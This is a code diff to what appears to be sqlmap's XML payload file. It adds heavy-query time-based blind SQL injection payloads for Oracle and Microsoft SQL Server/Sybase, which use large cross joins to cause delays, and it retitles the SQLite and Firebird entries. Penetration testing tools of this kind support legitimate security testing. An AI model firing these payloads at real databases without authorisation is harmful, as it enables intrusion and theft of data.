@@ -1343,7 +1343,43 @@ Formats:
     </test>
 
     <test>
-        <title>SQLite &gt; 2.0 AND time-based blind</title>
+        <title>Oracle AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <request>
+            <payload>AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)>0</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <request>
+            <payload>AND (SELECT count(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>0</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt; 2.0 AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>3</level>
         <risk>1</risk>
@@ -1363,7 +1399,7 @@ Formats:
     </test>
 
     <test>
-        <title>Firebird AND time-based blind</title>
+        <title>Firebird AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>1</risk>
@@ -1430,7 +1466,43 @@ Formats:
     </test>
 
     <test>
-        <title>SQLite &gt; 2.0 OR time-based blind</title>
+        <title>Oracle OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <request>
+            <payload>OR (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)>0</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    
+    <test>
+        <title>Microsoft SQL Server/Sybase OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <request>
+            <payload>OR (SELECT count(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>0</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt; 2.0 OR time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>3</risk>
@@ -1450,7 +1522,7 @@ Formats:
     </test>
 
     <test>
-        <title>Firebird OR time-based blind</title>
+        <title>Firebird OR time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>5</level>
         <risk>3</risk>
